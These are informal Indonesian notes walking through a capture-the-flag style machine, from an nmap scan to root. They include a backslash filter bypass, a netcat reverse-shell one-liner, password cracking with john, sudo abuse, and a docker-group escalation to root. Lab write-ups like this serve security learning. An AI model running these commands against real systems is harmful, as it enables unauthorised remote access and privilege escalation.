1. scan namp 21 22 80 masuk -> ftp anonymous allow get aja file nya
2. ada pesan tuh -> fuzz dir ada path yg bisa execute command tapi di filter
3. bypass filternya pake \ ternyata -> l\s -la
4. revshell gini -> r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.17.45.126 6060 >/tmp/f
5. filter command awal doang dah keknya 
6. di linpeas nemu service disini -> 127.0.0.1:9001 -> sama nemu authorized_keys
7. gada apa apa ternyata -> di apaar ada file sh -> sudo -l disitu aja bisa
8. baca code nya -> read 2 dia baca command -> sudo -u namauser jalanin_yg_disudo-L -> pas read 2 /bin/bash
9. pake python3 server aja ambil file nya yang di /var/www/files disitu ada webportal download image nya 
10. di steghide extract ada isinya -> tapi butuh passwd -> zip2john nama.zip > hash
11. john hash --wordlist=rockyou -> ada sourcecode base64 passwd
12. dapet creds di zip isinya -> cek pake id -> masuk groups docker
13. docker run -v /:/mnt --rm -it alpine chroot /mnt sh
14. klaim root
